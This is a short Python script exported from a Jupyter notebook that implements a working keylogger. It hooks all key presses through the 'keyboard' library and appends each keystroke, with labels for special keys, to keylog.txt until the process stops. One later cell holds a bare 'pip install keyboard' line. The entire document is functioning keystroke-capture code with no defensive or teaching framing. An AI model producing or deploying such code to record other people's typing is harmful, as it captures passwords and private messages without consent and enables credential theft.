#!/usr/bin/env python
# coding: utf-8

# In[ ]:


import keyboard

def keylogger():
    log_file = "keylog.txt"
    
    # Open the log file in append mode
    with open(log_file, "a") as f:
        f.write("\n\n*** Keylogger Started ***\n")
    
    # Define a callback function to handle key events
    def callback(event):
        key = event.name
        
        # Ignore special keys
        if len(key) > 1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = "[ENTER]\n"
            elif key == "backspace":
                key = "[BACKSPACE]"
            else:
                key = f"[{key.upper()}]"
        
        # Write the key to the log file
        with open(log_file, "a") as f:
            f.write(key)
    
    # Set the callback function for key events
    keyboard.on_press(callback)
    
    # Block the program from exiting
    keyboard.wait()

if __name__ == "__main__":
    keylogger()


# In[ ]:


pip install keyboard


# In[ ]:




